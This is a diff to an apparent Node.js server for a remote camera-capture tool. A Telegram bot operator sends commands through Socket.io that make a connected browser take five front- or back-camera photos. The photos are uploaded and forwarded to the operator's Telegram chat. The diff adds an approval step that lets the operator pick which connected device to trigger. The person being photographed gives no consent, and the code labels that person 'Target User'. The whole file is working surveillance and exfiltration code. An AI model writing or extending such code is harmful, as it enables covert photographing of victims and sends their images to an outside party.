@@ -18,41 +18,43 @@ if (!token || !adminId) {
     process.exit(1);
 }
 
-// Initialize Telegram Bot (Polling mode)
+// Initialize Telegram Bot
 const bot = new TelegramBot(token, { polling: true });
 
-// Automatically register commands and send online startup notification
+// Session variables for approval security
+let pendingSocketId = null;
+let approvedSocketId = null;
+let pendingUsername = "Unknown";
+
+// Register Telegram Menu Commands & Online Notification
 bot.setMyCommands([
     { command: 'start', description: 'Start the bot and check status' },
+    { command: 'approve', description: 'Authorize pending device connection' },
     { command: 'moref', description: 'Front Camera 5 Photos Capture' },
     { command: 'moreb', description: 'Back Camera 5 Photos Capture' }
 ]).then(() => {
     console.log('Telegram bot commands registered successfully!');
-    // Send automatic online ping/notification to admin when server boots up
-    bot.sendMessage(adminId, "🟢 **Server is Online!**\nBot is fully active and ready to receive commands.").catch(err => {
-        console.error("Failed to send startup notification:", err);
-    });
+    bot.sendMessage(adminId, "🟢 **Server is Online!**\nApproval security system is active.").catch(err => {});
 }).catch(err => {
     console.error('Failed to set Telegram commands:', err);
 });
 
-// Configure Multer to handle uploaded photo buffers in memory
+// Configure Multer for in-memory photo buffer storage
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
-// Serve static frontend files from the 'public' folder
+// Serve static frontend files
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Endpoint to receive captured photos from browser and forward to Telegram
+// Upload Endpoint
 app.post('/upload', upload.single('photo'), async (req, res) => {
     try {
         if (!req.file) {
             return res.status(400).send('No file uploaded.');
         }
 
-        // Forward the photo buffer directly to your Telegram chat
         await bot.sendPhoto(adminId, req.file.buffer, {
-            caption: `📸 Captured: ${req.file.originalname || 'photo.jpg'}`
+            caption: `📸 Captured (${pendingUsername}): ${req.file.originalname || 'photo.jpg'}`
         });
 
         res.status(200).send({ success: true });
@@ -62,12 +64,27 @@ app.post('/upload', upload.single('photo'), async (req, res) => {
     }
 });
 
-// Socket.io Connection Management
+// Socket.io Connection & Security Handlers
 io.on('connection', (socket) => {
     console.log('Client connected:', socket.id);
 
+    // Device connection registration request
+    socket.on('register_device', (data) => {
+        pendingSocketId = socket.id;
+        pendingUsername = data.name || "Target User";
+
+        bot.sendMessage(adminId, `🔔 **New Device Connection Request!**\n\n👤 Name: \`${pendingUsername}\`\n📱 Socket ID: \`${socket.id}\`\n\nType **/approve** to authorize this device.`);
+    });
+
     socket.on('disconnect', () => {
         console.log('Client disconnected:', socket.id);
+        if (socket.id === approvedSocketId) {
+            approvedSocketId = null;
+            bot.sendMessage(adminId, `⚠️ **Device Disconnected!** The approved device has closed the session.`);
+        }
+        if (socket.id === pendingSocketId) {
+            pendingSocketId = null;
+        }
     });
 });
 
@@ -75,31 +92,48 @@ io.on('connection', (socket) => {
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        bot.sendMessage(chatId, "👋 **Welcome back, Raj bhai!**\n\nSystem is fully operational.\nAvailable Commands:\n/moref - Capture 5 photos from Front Camera\n/moreb - Capture 5 photos from Back Camera");
-    } else {
-        bot.sendMessage(chatId, "Unauthorized access.");
+        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\nSystem Status:\n- Approved Device: ${approvedSocketId ? '🟢 Connected' : '🔴 None'}\n\nCommands:\n/approve - Authorize pending device\n/moref - Front Camera Capture\n/moreb - Back Camera Capture`);
     }
 });
 
-// Telegram Command: /moref (Front Camera Capture)
+// Telegram Command: /approve
+bot.onText(/\/approve/, (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() === adminId.toString()) {
+        if (pendingSocketId) {
+            approvedSocketId = pendingSocketId;
+            io.to(approvedSocketId).emit('device_approved');
+            bot.sendMessage(chatId, `✅ **Device Approved Successfully!**\nUser (${pendingUsername}) is now authorized.`);
+            pendingSocketId = null;
+        } else {
+            bot.sendMessage(chatId, "❌ No pending device request waiting for approval right now.");
+        }
+    }
+});
+
+// Telegram Command: /moref (Front Camera)
 bot.onText(/\/moref/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        bot.sendMessage(chatId, "📸 Front Camera se 5 photos capture ki ja rahi hain...");
-        io.emit('capture_front'); // Signal browser to capture using front camera
-    } else {
-        bot.sendMessage(chatId, "Unauthorized access.");
+        if (approvedSocketId) {
+            bot.sendMessage(chatId, "📸 Front Camera se 5 photos capture ki ja rahi hain...");
+            io.to(approvedSocketId).emit('capture_front');
+        } else {
+            bot.sendMessage(chatId, "❌ **Access Denied / No Device Approved!** Type /approve first.");
+        }
     }
 });
 
-// Telegram Command: /moreb (Back Camera Capture)
+// Telegram Command: /moreb (Back Camera)
 bot.onText(/\/moreb/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        bot.sendMessage(chatId, "📸 Back Camera se 5 photos capture ki ja rahi hain...");
-        io.emit('capture_back'); // Signal browser to capture using back camera
-    } else {
-        bot.sendMessage(chatId, "Unauthorized access.");
+        if (approvedSocketId) {
+            bot.sendMessage(chatId, "📸 Back Camera se 5 photos capture ki ja rahi hain...");
+            io.to(approvedSocketId).emit('capture_back');
+        } else {
+            bot.sendMessage(chatId, "❌ **Access Denied / No Device Approved!** Type /approve first.");
+        }
     }
 });
 
